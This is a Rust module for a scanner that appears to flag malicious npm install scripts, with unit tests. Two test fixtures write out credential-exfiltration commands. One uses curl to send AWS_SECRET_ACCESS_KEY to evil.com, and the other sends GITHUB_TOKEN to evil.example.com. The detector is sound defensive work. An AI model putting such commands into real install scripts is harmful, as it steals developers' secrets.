pub mod threat;
pub mod risk_score;

use crate::parser::PackageJson;
use threat::{ThreatDetector, ThreatIndicator};
use risk_score::RiskScore;

pub struct ScriptAnalysis {
    pub script_name: String,
    pub script_content: String,
    pub threats: Vec<ThreatIndicator>,
    pub risk_score: RiskScore,
}

pub struct AnalysisResult {
    pub package_name: String,
    pub package_version: String,
    pub scripts: Vec<ScriptAnalysis>,
}

impl AnalysisResult {
    pub fn should_block(&self) -> bool {
        self.scripts.iter().any(|s| s.risk_score.should_block())
    }

    pub fn is_suspicious(&self) -> bool {
        self.scripts.iter().any(|s| s.risk_score.is_suspicious())
    }
}

pub const INSTALL_SCRIPTS: [&str; 3] = ["preinstall", "install", "postinstall"];

pub fn analyze(pkg: &PackageJson) -> AnalysisResult {
    let mut scripts = Vec::new();

    if let Some(pkg_scripts) = &pkg.scripts {
        for (name, content) in pkg_scripts {
            if INSTALL_SCRIPTS.contains(&name.as_str()) {
                let threats = ThreatDetector::detect_threats(content);
                let risk_score = RiskScore::calculate(&threats);
                scripts.push(ScriptAnalysis {
                    script_name: name.clone(),
                    script_content: content.clone(),
                    threats,
                    risk_score,
                });
            }
        }
    }

    // Sort by severity descending so highest risk scripts appear first
    scripts.sort_by(|a, b| b.risk_score.severity.cmp(&a.risk_score.severity));

    AnalysisResult {
        package_name: pkg.name.clone().unwrap_or_else(|| "unknown".to_string()),
        package_version: pkg.version.clone().unwrap_or_else(|| "unknown".to_string()),
        scripts,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::PackageJson;
    use std::collections::HashMap;

    fn make_pkg(scripts: Vec<(&str, &str)>) -> PackageJson {
        let mut map = HashMap::new();
        for (k, v) in scripts {
            map.insert(k.to_string(), v.to_string());
        }
        PackageJson {
            name: Some("test-pkg".to_string()),
            version: Some("1.0.0".to_string()),
            scripts: Some(map),
            dependencies: None,
            dev_dependencies: None,
        }
    }

    #[test]
    fn test_analyze_no_scripts_field() {
        let pkg = PackageJson {
            name: Some("empty".to_string()),
            version: Some("1.0.0".to_string()),
            scripts: None,
            dependencies: None,
            dev_dependencies: None,
        };
        let result = analyze(&pkg);
        assert!(result.scripts.is_empty());
        assert!(!result.should_block());
        assert!(!result.is_suspicious());
    }

    #[test]
    fn test_analyze_non_install_scripts_ignored() {
        let pkg = make_pkg(vec![
            ("build", "tsc"),
            ("test", "jest"),
            ("start", "node index.js"),
        ]);
        let result = analyze(&pkg);
        assert!(result.scripts.is_empty());
    }

    #[test]
    fn test_analyze_all_install_scripts_extracted() {
        let pkg = make_pkg(vec![
            ("build", "tsc"),
            ("preinstall", "echo pre"),
            ("install", "echo install"),
            ("postinstall", "echo post"),
        ]);
        let result = analyze(&pkg);
        assert_eq!(result.scripts.len(), 3);
        let names: Vec<&str> = result.scripts.iter().map(|s| s.script_name.as_str()).collect();
        assert!(names.contains(&"preinstall"));
        assert!(names.contains(&"install"));
        assert!(names.contains(&"postinstall"));
    }

    #[test]
    fn test_analyze_sorted_highest_severity_first() {
        let pkg = make_pkg(vec![
            ("postinstall", "echo hello"),
            ("preinstall", r#"require('child_process').exec('curl https://evil.com/?t=' + process.env.AWS_SECRET_ACCESS_KEY)"#),
        ]);
        let result = analyze(&pkg);
        assert_eq!(result.scripts.len(), 2);
        let first = &result.scripts[0];
        let second = &result.scripts[1];
        assert!(first.risk_score.severity >= second.risk_score.severity);
    }

    #[test]
    fn test_analyze_package_metadata() {
        let result = analyze(&make_pkg(vec![]));
        assert_eq!(result.package_name, "test-pkg");
        assert_eq!(result.package_version, "1.0.0");
    }

    #[test]
    fn test_analyze_unknown_fallback_for_missing_fields() {
        let pkg = PackageJson {
            name: None,
            version: None,
            scripts: None,
            dependencies: None,
            dev_dependencies: None,
        };
        let result = analyze(&pkg);
        assert_eq!(result.package_name, "unknown");
        assert_eq!(result.package_version, "unknown");
    }

    #[test]
    fn test_malicious_preinstall_triggers_verdict() {
        let script = r#"node -e "const cp = require('child_process'); cp.exec('curl https://evil.example.com/exfil?token=' + process.env.GITHUB_TOKEN);""#;
        let pkg = make_pkg(vec![("preinstall", script)]);
        let result = analyze(&pkg);
        assert!(!result.scripts.is_empty());
        assert!(result.is_suspicious() || result.should_block());
    }

    #[test]
    fn test_clean_echo_script_passes() {
        let pkg = make_pkg(vec![("postinstall", "echo 'Installation complete'")]);
        let result = analyze(&pkg);
        assert_eq!(result.scripts.len(), 1);
        assert!(!result.should_block());
        assert!(!result.is_suspicious());
    }

    #[test]
    fn test_install_scripts_constant_coverage() {
        for script_name in INSTALL_SCRIPTS.iter() {
            let pkg = make_pkg(vec![(script_name, "echo test")]);
            let result = analyze(&pkg);
            assert_eq!(result.scripts.len(), 1, "{} should be scanned", script_name);
        }
    }
}
